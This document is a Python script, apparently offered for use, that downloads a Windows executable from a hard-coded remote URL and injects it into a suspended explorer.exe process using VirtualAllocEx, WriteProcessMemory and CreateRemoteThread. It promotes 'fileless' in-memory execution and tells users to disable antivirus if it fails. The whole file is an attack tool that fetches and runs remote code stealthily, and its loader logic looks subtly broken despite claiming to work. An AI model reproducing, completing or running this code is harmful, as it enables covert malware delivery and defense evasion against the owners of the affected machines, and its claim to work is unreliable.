# Save this as working_injector.py
import ctypes
import urllib.request
import struct
import sys

# Windows API
k32 = ctypes.WinDLL('kernel32', use_last_error=True)

# Constants
PROCESS_ALL_ACCESS = 0x1F0FFF
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_READWRITE = 0x04
PAGE_EXECUTE_READWRITE = 0x40
CREATE_SUSPENDED = 0x4
CREATE_NO_WINDOW = 0x08000000

# Structures
class STARTUPINFOW(ctypes.Structure):
    _fields_ = [
        ("cb", ctypes.c_ulong),
        ("lpReserved", ctypes.c_wchar_p),
        ("lpDesktop", ctypes.c_wchar_p),
        ("lpTitle", ctypes.c_wchar_p),
        ("dwX", ctypes.c_ulong),
        ("dwY", ctypes.c_ulong),
        ("dwXSize", ctypes.c_ulong),
        ("dwYSize", ctypes.c_ulong),
        ("dwXCountChars", ctypes.c_ulong),
        ("dwYCountChars", ctypes.c_ulong),
        ("dwFillAttribute", ctypes.c_ulong),
        ("dwFlags", ctypes.c_ulong),
        ("wShowWindow", ctypes.c_ushort),
        ("cbReserved2", ctypes.c_ushort),
        ("lpReserved2", ctypes.c_void_p),
        ("hStdInput", ctypes.c_void_p),
        ("hStdOutput", ctypes.c_void_p),
        ("hStdError", ctypes.c_void_p),
    ]

class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("hProcess", ctypes.c_void_p),
        ("hThread", ctypes.c_void_p),
        ("dwProcessId", ctypes.c_ulong),
        ("dwThreadId", ctypes.c_ulong),
    ]

def inject_pe(pe_url, target_process="explorer.exe"):
    print(f"[1] Downloading: {pe_url}")
    
    # Download PE
    try:
        headers = {'User-Agent': 'Mozilla/5.0'}
        req = urllib.request.Request(pe_url, headers=headers)
        with urllib.request.urlopen(req) as response:
            pe_data = response.read()
    except Exception as e:
        print(f"[-] Download failed: {e}")
        return False
    
    if len(pe_data) < 100 or pe_data[0:2] != b'MZ':
        print("[-] Invalid PE file")
        return False
    
    print(f"[2] Downloaded {len(pe_data):,} bytes")
    
    # Parse PE
    pe_offset = struct.unpack('<I', pe_data[60:64])[0]
    image_size = struct.unpack('<I', pe_data[pe_offset+80:pe_offset+84])[0]
    print(f"[3] Image size: {image_size:,} bytes")
    
    # Create suspended process
    print(f"[4] Creating: {target_process}")
    
    si = STARTUPINFOW()
    si.cb = ctypes.sizeof(STARTUPINFOW)
    pi = PROCESS_INFORMATION()
    
    # CreateProcessW - FIXED: Use CREATE_NO_WINDOW for GUI processes
    result = k32.CreateProcessW(
        None,
        target_process,
        None,
        None,
        False,
        CREATE_SUSPENDED,
        None,
        None,
        ctypes.byref(si),
        ctypes.byref(pi)
    )
    
    if not result:
        error = ctypes.get_last_error()
        print(f"[-] CreateProcess failed: {error}")
        return False
    
    print(f"[5] Process created (PID: {pi.dwProcessId})")
    
    # Allocate memory
    alloc_addr = k32.VirtualAllocEx(
        pi.hProcess,
        0,
        image_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    )
    
    if not alloc_addr:
        error = ctypes.get_last_error()
        print(f"[-] VirtualAllocEx failed: {error}")
        k32.CloseHandle(pi.hProcess)
        k32.CloseHandle(pi.hThread)
        return False
    
    print(f"[6] Memory allocated at: {hex(alloc_addr)}")
    
    # Write PE - FIXED: Convert to ctypes buffer
    written = ctypes.c_size_t(0)
    
    # Write entire PE at once (simpler method)
    buffer_type = ctypes.c_char * len(pe_data)
    buffer = buffer_type.from_buffer_copy(pe_data)
    
    # Write entire image
    result = k32.WriteProcessMemory(
        pi.hProcess,
        alloc_addr,
        ctypes.byref(buffer),
        len(pe_data),
        ctypes.byref(written)
    )
    
    if not result or written.value != len(pe_data):
        error = ctypes.get_last_error()
        print(f"[-] WriteProcessMemory failed: {error}")
        print(f"    Wrote {written.value} of {len(pe_data)} bytes")
        k32.CloseHandle(pi.hProcess)
        k32.CloseHandle(pi.hThread)
        return False
    
    print(f"[7] Wrote {written.value:,} bytes")
    
    # Set memory protection
    old_protect = ctypes.c_ulong(0)
    k32.VirtualProtectEx(
        pi.hProcess,
        alloc_addr,
        image_size,
        PAGE_EXECUTE_READWRITE,
        ctypes.byref(old_protect)
    )
    
    # Simple method: Just resume (process hollowing alternative)
    print("[8] Resuming thread...")
    
    # For GUI apps, we need to redirect execution
    # Calculate entry point
    entry_point = struct.unpack('<I', pe_data[pe_offset+40:pe_offset+44])[0]
    entry_addr = alloc_addr + entry_point
    
    # Create remote thread at entry point
    thread_id = ctypes.c_ulong(0)
    h_thread = k32.CreateRemoteThread(
        pi.hProcess,
        None,
        0,
        entry_addr,
        None,
        0,
        ctypes.byref(thread_id)
    )
    
    if h_thread:
        print(f"[9] Remote thread created (TID: {thread_id.value})")
        k32.CloseHandle(h_thread)
    else:
        # Fallback: just resume original thread
        print("[9] Using original thread")
        k32.ResumeThread(pi.hThread)
    
    # Cleanup
    k32.CloseHandle(pi.hThread)
    k32.CloseHandle(pi.hProcess)
    
    print("[+] Injection successful!")
    print(f"[+] GUI EXE running in {target_process} at {hex(entry_addr)}")
    return True

def main():
    print("=== WORKING Fileless PE Injector ===")
    print("GUI Application Support")
    print("=" * 35)
    
    # Check admin
    try:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if not is_admin:
            print("⚠  Warning: Not running as Administrator")
            print("   Some features may not work")
    except:
        pass
    
    # Your EXE URL
    default_url = "https://raw.githubusercontent.com/pleasehelp09052010-sudo/HIDENTHOSEWHOKNOW/main/RhAS8@nga/rCTnJexpp1.exe"
    default_target = "explorer.exe"
    
    print(f"\n📁 EXE URL: {default_url}")
    print(f"🎯 Target: {default_target}")
    
    use_default = input("\nPress Enter for defaults, or type 'n' for custom: ")
    
    if use_default.lower() == 'n':
        pe_url = input("Enter EXE URL: ")
        target = input("Enter target (default: explorer.exe): ") or "explorer.exe"
    else:
        pe_url = default_url
        target = default_target
    
    print(f"\n🚀 Starting injection...")
    print(f"📥 URL: {pe_url}")
    print(f"🎯 Target: {target}")
    print("─" * 50)
    
    success = inject_pe(pe_url, target)
    
    if success:
        print("\n✅ SUCCESS!")
        print("✅ The GUI application is now running")
        print("✅ Fileless execution in memory")
        print(f"✅ Embedded in: {target}")
        
        # Additional info for GUI apps
        print("\n💡 For GUI applications:")
        print("   • Check for new windows/taskbar icons")
        print("   • The app runs in the target process context")
        print("   • No files written to disk")
    else:
        print("\n❌ Injection failed")
        print("🔧 Troubleshooting:")
        print("   1. Run as Administrator")
        print("   2. Check if EXE is valid Windows PE")
        print("   3. Try different target (notepad.exe)")
        print("   4. Disable antivirus temporarily")
    
    input("\nPress Enter to exit...")

if __name__ == "__main__":
    main()
